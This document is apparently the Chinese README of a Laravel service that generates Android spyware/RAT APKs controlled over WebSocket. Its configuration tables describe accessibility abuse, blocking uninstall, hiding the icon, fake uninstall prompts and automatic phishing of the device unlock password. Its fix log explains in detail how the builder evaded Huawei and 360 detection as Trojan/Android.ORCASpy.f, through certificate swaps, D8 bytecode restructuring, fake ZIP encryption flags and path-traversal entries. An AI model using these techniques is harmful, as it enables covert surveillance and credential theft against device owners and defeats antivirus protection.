# APK Builder 服务文档

> Laravel 12 版本的 APK 动态构建服务，从旧系统迁移并现代化重构。

## 概述

APK Builder 是一个用于动态生成定制化 Android APK 的服务。它支持：

- 自定义包名、应用名称、图标
- WebSocket 服务器配置注入
- Smali 字节码修改
- 资源加密
- 代码混淆（垃圾类生成、类名混淆）
- APK 签名

## 架构

```
app/Services/ApkBuilder/
├── ApkBuilder.php          # 主构建服务（核心流程编排）
├── ApkBuildConfig.php      # 配置 DTO（参数验证）
├── ApkBuildResult.php      # 结果 DTO
├── Encryptor.php           # AES-128-CBC 加密服务
├── SmaliProcessor.php      # Smali 字节码处理
├── Obfuscator.php          # 代码混淆
├── ApkProtector.php        # APK 保护（DEX加密、完整性校验）
└── ApkBuilderConstants.php # 常量定义（包名词库等）

app/Exceptions/ApkBuilder/
└── ApkBuildException.php   # 自定义异常

app/Console/Commands/
└── BuildApkCommand.php     # Artisan 命令

app/scripts/
└── test-av-detection.sh    # AV 检测自动化测试脚本
```

## 构建流程

```
┌─────────────────────────────────────────────────────────────────┐
│                        APK 构建流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. check_dependencies    检查 Java、apktool 等依赖             │
│           ↓                                                     │
│  2. prepare_work_dir      创建临时目录，复制模板                 │
│           ↓                                                     │
│  3. modify_smali          修改 Smali 配置（服务器地址等）        │
│           ↓                                                     │
│  4. modify_manifest       修改 AndroidManifest.xml              │
│           ↓                                                     │
│  5. modify_resources      修改 strings.xml、apktool.yml         │
│           ↓                                                     │
│  6. replace_icon          替换应用图标                          │
│           ↓                                                     │
│  7. replace_background    替换启动背景图                        │
│           ↓                                                     │
│  8. generate_junk_classes 生成垃圾类（可选）                    │
│           ↓                                                     │
│  9. shuffle_classes       类名混淆（可选）                      │
│           ↓                                                     │
│ 10. obfuscate_strings     字符串混淆（可选）                    │
│           ↓                                                     │
│ 11. encrypt_strings       字符串加密（可选）                    │
│           ↓                                                     │
│ 12. encrypt_resources     加密 assets 资源                      │
│           ↓                                                     │
│ 13. inflate_manifest      膨胀 Manifest 至 765MB（可选）        │
│           ↓                                                     │
│ 14. build_apk             使用 apktool 重新打包                 │
│           ↓                                                     │
│ 15. r8_obfuscate          D8 字节码重组（可选，绕过 AV 签名）   │
│           ↓                                                     │
│ 16. apk_editor            APKEditor 重打包（可选）              │
│           ↓                                                     │
│ 17. modify_dex            DEX 头部修改（可选）                  │
│           ↓                                                     │
│ 18. protect_apk           假加密标志 + ZIP 保护（可选）         │
│           ↓                                                     │
│ 19. sign_apk              签名（apksigner v2）                  │
│           ↓                                                     │
│ 20. move_output           移动到输出目录                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 配置

### 配置文件

`config/apk-builder.php`

```php
return [
    // 路径配置
    'template_path' => storage_path('app/apk/template'),      // APK 模板目录
    'tools_path' => storage_path('app/apk/tools'),            // 构建工具目录
    'output_path' => storage_path('app/public/apk'),          // 输出目录
    'icons_path' => storage_path('app/public/icons'),         // 图标目录
    'backgrounds_path' => storage_path('app/public/backgrounds'), // 背景图目录
    'temp_path' => env('APK_BUILD_TEMP_PATH', ''),            // 临时目录

    // 加密配置（警告：修改会导致已构建 APK 失效）
    'encryption' => [
        'iv' => env('APK_ENCRYPTION_IV', '2230209522049090'),
        'password' => env('APK_ENCRYPTION_PASSWORD', '4814780584699673'),
        'salt' => env('APK_ENCRYPTION_SALT', '2894356330652558'),
        'iterations' => (int) env('APK_ENCRYPTION_ITERATIONS', 65536),
    ],

    // 保护功能
    'protection' => [
        'enable_junk_classes' => (bool) env('APK_ENABLE_JUNK_CLASSES', false),
        'enable_class_shuffle' => (bool) env('APK_ENABLE_CLASS_SHUFFLE', false),
        'enable_apk_protection' => (bool) env('APK_ENABLE_PROTECTION', false),
        'enable_dex_modification' => (bool) env('APK_ENABLE_DEX_MODIFICATION', false),
        'junk_class_count' => (int) env('APK_JUNK_CLASS_COUNT', 50),
        'junk_method_count' => (int) env('APK_JUNK_METHOD_COUNT', 10),
    ],

    // 构建超时（秒）
    'timeout' => (int) env('APK_BUILD_TIMEOUT', 300),

    // 清理设置
    'cleanup_on_success' => true,
    'cleanup_on_failure' => true,
];
```

### 环境变量

在 `.env` 中配置：

```env
# 路径
APK_BUILD_TEMP_PATH=/tmp/apk_builds

# 加密（生产环境必须修改）
APK_ENCRYPTION_IV=your_16_char_iv
APK_ENCRYPTION_PASSWORD=your_16_char_pw
APK_ENCRYPTION_SALT=your_16_char_salt
APK_ENCRYPTION_ITERATIONS=65536

# 默认资源
APK_DEFAULT_ICON=default/icon.png
APK_DEFAULT_BACKGROUND=black

# 保护功能
APK_ENABLE_JUNK_CLASSES=false
APK_ENABLE_CLASS_SHUFFLE=false
APK_ENABLE_PROTECTION=false
APK_ENABLE_DEX_MODIFICATION=false
APK_JUNK_CLASS_COUNT=50
APK_JUNK_METHOD_COUNT=10

# 超时
APK_BUILD_TIMEOUT=300
```

## 使用方法

### 1. 代码调用

```php
use App\Services\ApkBuilder\ApkBuilder;
use App\Services\ApkBuilder\ApkBuildConfig;

// 创建配置
$config = ApkBuildConfig::fromArray([
    'app_id' => 'com.example.myapp',
    'user_id' => '1',
    'app_name' => '我的应用',
    'app_version' => '1.0.0',
    'user_host' => 'ws.example.com:8080',
    'use_wss' => true,
    'icon_path' => 'custom_icon.png',
    'background_path' => 'splash.png',
    'enable_junk_classes' => true,
    'junk_class_count' => 100,
]);

// 验证配置
$errors = $config->validate();
if (!empty($errors)) {
    throw new \InvalidArgumentException(implode(', ', $errors));
}

// 构建 APK
$builder = app(ApkBuilder::class);
$result = $builder->build($config);

// 获取结果
echo "APK 路径: " . $result->path;
echo "构建耗时: " . $result->formatTime();
```

### 2. Artisan 命令

```bash
# 基本用法
./vendor/bin/sail artisan apk:build \
    --app-id=com.example.app \
    --user-id=1 \
    --app-name="测试应用" \
    --user-host=localhost:8080

# 完整参数
./vendor/bin/sail artisan apk:build \
    --app-id=com.example.app \
    --user-id=1 \
    --app-name="测试应用" \
    --app-version=2.0.0 \
    --user-host=ws.example.com:8080 \
    --wss \
    --icon=custom/icon.png \
    --background=splash.png \
    --junk-classes \
    --shuffle-classes \
    --protect \
    --modify-dex

# 使用 JSON 配置文件
./vendor/bin/sail artisan apk:build --config=/path/to/config.json
```

### 3. JSON 配置文件格式

```json
{
    "app_id": "com.example.myapp",
    "user_id": "1",
    "app_name": "我的应用",
    "app_version": "1.0.0",
    "websocket_url": "ws://example.com:8081",
    "icon_path": "custom_icon.png",
    "background_path": "splash.png",
    "login_title": "欢迎使用",
    "login_dis": "请授权以继续",
    "login_btn": "开始",
    "enable_junk_classes": true,
    "enable_class_shuffle": true,
    "enable_string_obfuscation": true,
    "enable_apk_protection": true,
    "enable_dex_modification": true,
    "enable_fake_encryption": true,
    "enable_multi_package_junk": true,
    "enable_path_traversal_entries": true,
    "enable_r8_obfuscation": true,
    "junk_class_count": 100,
    "fake_entry_count": 320
}
```

## 配置参数说明

### ApkBuildConfig 属性

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `appId` | string | ✓ | - | 包名（如 `com.example.app`） |
| `userId` | string | ✓ | - | 用户 ID |
| `appName` | string | ✓ | - | 应用显示名称 |
| `appVersion` | string | ✓ | `1.0` | 版本号（如 `1.0.0`） |
| `userHost` | string | ✓ | - | WebSocket 服务器地址（`host:port`） |
| `clientName` | string | | `''` | 客户端标识 |
| `email` | string | | `''` | 用户邮箱 |
| `appUrl` | string | | `''` | 应用 URL |
| `iconPath` | string | | `''` | 图标文件路径 |
| `backgroundPath` | string | | `black` | 背景图路径或 `black` |
| `useWss` | bool | | `false` | 是否使用 WSS 协议 |
| `useAccess` | string | | `1` | 启用无障碍服务 |
| `useAntkill` | string | | `1` | 防止卸载（`1`=开启, `0`=关闭，通过 WebSocket `kb` 命令运行时控制） |
| `userAllprims` | string | | `1` | 请求所有权限 |
| `userBlackprims` | string | | `1` | 黑屏权限 |
| `hiddenApp` | string | | `1` | 隐藏应用图标（`1`=隐藏, `0`=显示） |
| `useDraw` | string | | `0` | 悬浮窗权限 |
| `openAccess` | string | | `0` | 自动打开无障碍 |
| `diaoType` | string | | `1` | 自动钓鱼解锁密码 |
| `hideType` | string | | `f` | 隐藏方式（`c`=直接隐藏, `f`=卸载隐藏, `k`=提示卸载，详见下方说明） |
| `installType` | string | | `g` | 安装引导类型 |
| `buildType` | string | | `C` | 构建类型（C=Custom, S=Store） |
| `loginTitle` | string | | `欢迎使用` | 登录界面标题 |
| `loginDis` | string | | `允许受限制的设置` | 登录界面描述 |
| `loginBtn` | string | | `开始` | 登录按钮文字 |
| `notifyTitle` | string | | ` ` | 通知标题 |
| `notifyMsg` | string | | `on` | 免杀保护（`on`=开启, `off`=关闭） |
| `enableJunkClasses` | bool | | `false` | 启用垃圾类生成 |
| `enableClassShuffle` | bool | | `false` | 启用类名混淆 |
| `enableStringObfuscation` | bool | | `false` | 启用字符串变量名混淆 |
| `enableFullStringEncryption` | bool | | `false` | 启用 const-string XOR 加密 |
| `enableApkProtection` | bool | | `false` | 启用 APK 保护（Manifest 膨胀 + APKEditor + ZIP 保护） |
| `enableDexModification` | bool | | `false` | 启用 DEX 头部修改 |
| `enableFakeEncryption` | bool | | `false` | 启用 ZIP 假加密标志（0xF741） |
| `enablePathTraversalEntries` | bool | | `false` | 启用路径穿越假条目 |
| `enableEocdTampering` | bool | | `false` | 启用 EOCD 篡改 |
| `enableMultiPackageJunk` | bool | | `false` | 启用三层包分布垃圾类 |
| `enableR8Obfuscation` | bool | | `false` | 启用 D8 字节码重组（绕过 AV 签名匹配） |
| `junkClassCount` | int | | `50` | 垃圾类数量 |
| `junkMethodCount` | int | | `10` | 每个垃圾类的方法数 |
| `fakeEntryCount` | int | | `120` | ZIP 假条目数量（建议 320） |
| `fakeComponentCount` | int | | `28` | 假 Android 组件数量 |

### 验证规则

| 字段 | 规则 |
|------|------|
| `appId` | 必填，有效包名格式（`^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$`） |
| `appVersion` | 必填，版本格式（`^\d+(\.\d+){0,2}$`） |
| `userHost` | 必填，`host:port` 格式，端口 1-65535 |
| `email` | 可选，有效邮箱格式 |
| `appName` | 最大 100 字符 |
| `loginTitle` | 最大 100 字符 |
| `loginDis` | 最大 200 字符 |
| `loginBtn` | 最大 50 字符 |
| `description` | 最大 500 字符 |

## 环境依赖

### Docker 环境

Dockerfile 已配置以下依赖：

```dockerfile
# OpenJDK 17
RUN apt-get install -y openjdk-17-jdk

# Android Build Tools
ENV ANDROID_SDK_ROOT=/opt/android-sdk
RUN sdkmanager "build-tools;34.0.0"
```

### 必需工具

| 工具 | 用途 | 位置 |
|------|------|------|
| `apktool.jar` | APK 反编译/重打包 | `storage/app/apk/tools/` |
| `APKEditor.jar` | APK ZIP 结构重打包 | `storage/app/apk/tools/` |
| `r8.jar` | D8 DEX 编译器（字节码重组） | `storage/app/apk/tools/` |
| `dex2jar/` | DEX ↔ JAR 转换工具集 | `storage/app/apk/tools/dex2jar/` |
| `signapk.jar` | APK 签名工具 | `storage/app/apk/tools/` |
| `release.keystore` | APK 签名密钥（自动生成） | `storage/app/apk/tools/` |
| Java 11+ | 运行构建工具 | 系统安装 |
| zipalign | APK 对齐优化 | Android SDK |
| apksigner | APK 签名 | Android SDK |

### 目录结构

```
storage/app/
├── apk/
│   ├── template/           # APK 模板（解压后的 apkstub）
│   │   ├── AndroidManifest.xml
│   │   ├── apktool.yml
│   │   ├── res/
│   │   └── smali/
│   └── tools/
│       ├── apktool.jar     # APK 反编译/重打包
│       ├── APKEditor.jar   # ZIP 结构重打包
│       ├── r8.jar          # D8 DEX 编译器
│       ├── signapk.jar     # 签名工具
│       ├── release.keystore # 签名密钥（自动生成）
│       ├── .keystore_meta.json
│       ├── dex2jar/        # DEX ↔ JAR 转换工具集
│       │   ├── d2j-dex2jar.sh
│       │   └── ...
│       ├── aapt2           # Android 资源编译器
│       └── debug.keystore
└── public/
    ├── apk/                # 构建输出
    │   └── {user_id}/
    │       └── {app_id}/
    │           └── {app_id}.apk
    ├── icons/              # 用户图标
    │   ├── default/
    │   │   └── icon.png
    │   └── {user_id}/
    └── backgrounds/        # 用户背景图
        └── {user_id}/
```

## 日志

APK 构建使用独立日志通道：

```php
// config/logging.php
'apk' => [
    'driver' => 'daily',
    'path' => storage_path('logs/apk/apk.log'),
    'level' => 'debug',
    'days' => 14,
],
```

查看日志：

```bash
# 实时查看
tail -f storage/logs/apk/apk-2026-01-31.log

# 或使用 Laravel 日志
./vendor/bin/sail artisan log:tail --channel=apk
```

## 错误处理

### ApkBuildException

所有构建错误都抛出 `ApkBuildException`，包含：

- `message`: 错误描述
- `context`: 详细上下文信息

```php
try {
    $result = $builder->build($config);
} catch (ApkBuildException $e) {
    Log::error('APK 构建失败', [
        'message' => $e->getMessage(),
        'context' => $e->context,
    ]);
}
```

### 常见错误

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| `Template not found` | 模板目录不存在 | 检查 `storage/app/apk/template/` |
| `Tool not found: apktool.jar` | 缺少构建工具 | 下载 apktool.jar 到 tools 目录 |
| `Java not installed` | Java 未安装 | 确保 Docker 镜像包含 JDK |
| `Config validation failed` | 配置参数无效 | 检查必填字段和格式 |
| `Signing failed` | 签名失败 | 检查 keystore 和签名工具 |

## 设备认证 Token

APK 构建时会自动生成 HMAC-SHA256 签名的设备认证 token，写入 APK 的 `[USER_MAIL]` 字段。设备上线时服务端验证此 token，防止伪造设备连接。

### Token 格式

```
email||{hmac_hex}.{build_id}.{timestamp}
```

- `hmac_hex` = `HMAC-SHA256(DEVICE_AUTH_SECRET, email|build_id|timestamp)`
- `||` 作为分隔符（email 中不会出现）
- 不设过期时间（APK 生命周期 = token 生命周期）

### 构建流程中的 Token 生成

`AppBuildController::stream()` 方法采用"先建记录再构建"模式：

1. `AppBuild::create()` 获取 `build->id`
2. `DeviceTokenService::generateToken($email, $build->id)` 生成 token
3. 将 `email||token` 作为 `email` 传入 `ApkBuildConfig`，写入 APK
4. `build_config` 中存储纯 email（不含 token），避免泄露签名
5. 构建成功后更新 `file_path`、`device_token` 等字段；失败则删除记录

### ApkBuildConfig 兼容

`email` 字段支持 `email||token` 格式，验证时只校验 `||` 前的 email 部分。长度限制为 512 字符（HMAC token 约 100+ 字符）。

### 环境变量

```bash
# .env — 生产环境必须设置强随机值
DEVICE_AUTH_SECRET=your-random-secret-key
```

详见 [WEBSOCKET_SERVER_PHP.md](./WEBSOCKET_SERVER_PHP.md) 中的设备认证章节。

---

## 安全注意事项

1. **命令注入防护**：所有外部命令参数都使用 `escapeshellarg()` 转义
2. **配置验证**：`ApkBuildConfig::validate()` 验证所有输入
3. **加密密钥**：生产环境必须修改默认加密配置
4. **临时文件清理**：构建完成后自动清理临时目录
5. **设备认证**：APK 构建时注入 HMAC token，服务端验证防止伪造设备

## 隐藏模式与防卸载字段说明

### 字段映射（旧系统 → 新系统 → Smali）

| 功能 | 旧前端字段 | 新前端字段 | Smali 占位符 | Smali 运行时字段 | 值 |
|------|-----------|-----------|-------------|-----------------|-----|
| 隐藏方式 | `hidtype` | `hide_type` | `[USE-FAKE]` | `Hide_Type` | `c`/`f`/`k` |
| 防止卸载 | `ukill` | `use_antkill` | `[USE-NOKILL]` | `Anti_Kill` | `0`/`1` |
| 隐藏应用 | `hidapp` | `hidden_app` | `[USE-HIDDEEN]` | — | `0`/`1` |
| 免杀保护 | `notmsg` | `notify_msg` | `[_NOTIFI_MSG_]` | `_Notfy_MSG_` | `on`/`off` |

> 注意：`[USE-HIDDEEN]` 是旧系统遗留的拼写错误（三个 E），不可修改。

### hide_type 值的 Smali 运行时行为

| 值 | 前端标签 | Smali 行为 | 说明 |
|----|---------|-----------|------|
| `c` | 直接隐藏（推荐） | 无障碍服务检测到卸载 UI → 按 HOME 键跳走 | r2.smali 中 6 处检查，MuteUninstall 中 2 处检查 |
| `k` | 模拟卸载 | 弹出 MuteUninstall 提示"系统不兼容"→ 用户点击卸载后图标变透明，软件继续后台运行 | m.smali 中 2 处检查，MuteUninstall 中 2 处检查 |
| `f` | 无隐藏保护 | 不匹配 `c` 也不匹配 `k`，无拦截行为 | Smali 中无直接比较，作为"透传"值使用 |

### "无隐藏保护"（hide_type=f）的实际工作原理

`hide_type=f` 本身不触发任何隐藏拦截行为。它需要与其他字段配合：

1. `use_antkill=1` → 赋予 app 防卸载**能力**（通过 WebSocket `kb` 命令运行时控制）
2. 运行时由 WebSocket 服务端通过 `kb` 命令控制开关：
   - `kbstate=2` → 启用防卸载（拦截卸载 UI → 按 HOME 键跳走）
   - `kbstate=3` → 临时禁用防卸载（允许卸载流程正常显示）
3. `hidden_app=1` → 隐藏应用图标

> ⚠️ **已知限制**：当 `kbstate=3` 禁用防卸载拦截后，app 会被**真正卸载**。APK 中没有实现"假卸载后隐藏图标"的机制（`HiddenActivity` 在 AndroidManifest.xml 中被设置为 `android:enabled="false"`，无法接收 `PACKAGE_REMOVED` 广播）。

## 迁移自旧系统

本服务从 `legacy/src/private/ApkBuilder/` 迁移，主要改进：

| 方面 | 旧系统 | 新系统 |
|------|--------|--------|
| 架构 | 单文件 PHP | 服务类 + DTO |
| 配置 | 硬编码 | 外部化配置文件 |
| 验证 | 无 | 完整输入验证 |
| 安全 | 命令拼接 | escapeshellarg 转义 |
| 日志 | 文件写入 | Laravel 日志通道 |
| 依赖注入 | 无 | 服务容器单例 |
| 错误处理 | 返回码 | 自定义异常 |

## 已知问题和修复历史

### 2026-02-06: APK 加载页面乱码问题

#### 问题描述

构建的 APK 在加载页面出现乱码，表现为：
- "欢迎使用" 界面正常显示，进度条加载到一半后页面变空白
- 随后显示大量无法识别的字符（二进制乱码）

#### 根本原因

**问题 1: Assets 文件未被加密**

PHP 的 `glob()` 函数不支持 `**` 递归通配符语法：

```php
// 错误：glob('/**/*') 在 PHP 中不能递归匹配
$files = glob($assetsPath . '/**/*');
// 只匹配到 dexopt/ 子目录的文件，没有匹配根目录的 .bt 文件
```

导致 `0.bt` ~ `10.bt` 这些 HTML 文件没有被加密。

**问题 2: APK 解密逻辑**

APK 运行时检测 `AsstsKey` 是否等于默认占位符 `[AST-PAS]`：
- 如果等于默认值，直接读取文件（假设未加密）
- 如果不等于默认值，使用 AsstsKey 进行 XOR 解密

由于 `AsstsKey` 已被替换为新密钥，APK 尝试解密未加密的 HTML 文件，XOR 操作将正常内容变成乱码。

**问题 3: `[USE-AUTOGRANT]` 占位符映射错误**

`[USE-AUTOGRANT]` 在 APK 模板中被赋值给 `loadingText` 字段（加载页标题），但代码错误地将其映射为 `useAtoprims`（"0" 或 "1"）。

#### 修复方案

1. **修复 assets 加密 glob 模式** (`ApkBuilder.php`)：
   ```php
   // 修复前
   $files = $this->fileSystem->glob($assetsPath . '/**/*');
   
   // 修复后：只加密根目录文件（与 VB.NET EncryptFolder 行为一致）
   $files = $this->fileSystem->glob($assetsPath . '/*');
   ```

2. **修复 `[USE-AUTOGRANT]` 映射** (`SmaliProcessor.php`)：
   ```php
   // 修复前
   '[USE-AUTOGRANT]' => $config->useAtoprims,
   
   // 修复后
   '[USE-AUTOGRANT]' => $this->escapeForSmaliString($config->loginTitle),
   ```

#### 技术细节

| 占位符 | APK 模板用途 | 修复前映射 | 修复后映射 |
|--------|-------------|-----------|-----------|
| `[USE-AUTOGRANT]` | `loadingText`（加载页标题） | `useAtoprims` ("0"/"1") | `loginTitle` ("欢迎使用") |
| `[AST-PAS]` | `AsstsKey`（assets 解密密钥） | 正确 | 正确 |

---

### 2026-03-12: APK 报毒问题（华为 HISEC — Trojan/Android.ORCASpy.f）

#### 问题描述

构建的 APK 在华为手机（FIN-AL60, Android 12）上安装后被检测为"病毒应用"（`Trojan/Android.ORCASpy.f[pry,rmt,spy,gen]`），华为内置 AVL + 360 双引擎在 3 秒内完成本地静态签名匹配。

#### 调试过程

**第一阶段：签名证书问题**

发现 `storage/app/apk/tools/certificate.pem` + `key.pk8` 是 AOSP 测试签名证书（`CN=Android, OU=Android, O=Android`），该证书指纹被全球 AV 引擎收录为已知恶意软件签名。删除后签名自动 fallback 到 `release.keystore`（`CN=App, OU=Mobile, O=Company`）。

但删除 AOSP testkey 后仍然报毒 — 之前的 PASS 是 `test-av-detection.sh` 检测逻辑有 bug（误报）。

**第二阶段：caobizy.apk 对比分析**

关键发现：caobizy.apk **不是**旧版 EaodWorker.exe 构建的，而是从 Android Studio 用 R8/ProGuard 编译的原生 APK。证据：
- `Lmyobfuscated/` 出现上万次（R8 编译器产物）
- 无 DexEditor/APKProtector/APKEditor/apktool 痕迹
- 7 个 DEX 文件（R8 multidex 自然产物）

**第三阶段：字节码模式签名匹配**

两个 APK 都包含相同的恶意代码特征字符串（`icontrol`、`protector`、`AccessibilityService` 等），但 caobizy 通过了扫描。说明 AV 的 ORCASpy.f 签名匹配的是**方法体字节码模式**（寄存器分配、指令序列、控制流结构），不是简单的字符串匹配。

caobizy 通过 R8 编译后字节码结构被彻底重组，签名无法匹配。我们的 APK 通过 apktool 反编译→重打包，保留了原始 stub 模板的字节码模式。

**第四阶段：D8 字节码重组方案**

R8 会删除/合并类，破坏 Manifest 中的组件引用（AXML 中的类名无法被 R8 更新）。改用 D8（纯 DEX 编译器）：DEX → dex2jar → JAR → D8 → DEX。往返转换改变了寄存器分配和指令排序，足以破坏 AV 字节码模式签名，且不删除/重命名任何类。

#### 根因总结

| 层级 | 根因 | 解决方案 |
|------|------|---------|
| 签名证书 | AOSP testkey 在 AV 黑名单 | 删除 `certificate.pem` + `key.pk8`，使用 `release.keystore` |
| 字节码模式 | DEX 保留原始 stub 字节码结构，匹配 ORCASpy.f 签名 | D8 往返转换重组字节码（`enableR8Obfuscation`） |
| ZIP 标志位 | `FAKE_ENCRYPTION_FLAG` 不够强 | 从 `0x0041` 改为 `0xF741`（对齐 caobizy 的 `0xff49`） |

#### 代码改动

| 文件 | 改动 |
|------|------|
| `ApkBuilder.php` | 新增 `r8Obfuscate()` 步骤 + `extractManifestComponentClasses()` |
| `ApkBuildConfig.php` | 新增 `enableR8Obfuscation` 配置开关 |
| `ApkProtector.php` | `FAKE_ENCRYPTION_FLAG` 从 `0x0041` 改为 `0xF741` |
| `scripts/test-av-detection.sh` | 修复早期检测误报 + `pm list` 重试机制 |
| `storage/app/apk/tools/` | 删除 AOSP testkey，新增 `r8.jar` + `dex2jar/` |

#### D8 字节码重组流程

```
apktool build 产出 APK
        ↓
从 APK 提取 classes*.dex (ZipArchive)
        ↓
dex2jar: DEX → JAR (每个 DEX 单独转换)
        ↓
D8: 所有 JAR → DEX (java -cp r8.jar com.android.tools.r8.D8)
        ↓
替换 APK 中的 DEX 文件 (ZipArchive)
        ↓
继续 APKEditor → modify_dex → protect_apk → sign_apk
```

#### 华为 AV 扫描链（logcat 逆向分析）

```
AntiVirusReceiver.onReceive（安装触发）
  → AntiVirusScanService（启动 security_scan 进程）
    → AvlAntivirusEngine + QihooAntivirusEngine（AVL + 360 双引擎并行）
      → AiProtectionPlugin.setStaticVirusScanResult（扫描结果回调）
        → 如果检测到病毒:
          → Restriction_MaliciousAppChangedHandler: EXIST_MALICIOUS_APP
          → VIRUS_NEW 广播
          → VirusNotifyService（弹出病毒通知）
        → 如果未检测到:
          → 无后续动作
  → getControlStrategy（云端信誉查询，约 15 秒后）
```

#### AV 检测测试脚本

```bash
# 构建 + 安装 + AV 检测一体化测试
./scripts/test-av-detection.sh /var/www/html/storage/apk-build-config.json

# 推荐的全保护配置
{
    "enable_apk_protection": true,
    "enable_dex_modification": true,
    "enable_fake_encryption": true,
    "enable_junk_classes": true,
    "enable_class_shuffle": true,
    "enable_string_obfuscation": true,
    "enable_multi_package_junk": true,
    "enable_path_traversal_entries": true,
    "enable_r8_obfuscation": true,
    "fake_entry_count": 320,
    "junk_class_count": 100
}
```

---

## 相关文档

- [APK_BUILD_SYSTEM.md](../legacy/APK_BUILD_SYSTEM.md) - 旧系统构建流程
- [APK_STUB_TEMPLATE.md](../legacy/APK_STUB_TEMPLATE.md) - APK 模板结构
- [APK_RUNTIME_FLOW.md](../legacy/APK_RUNTIME_FLOW.md) - APK 运行时行为
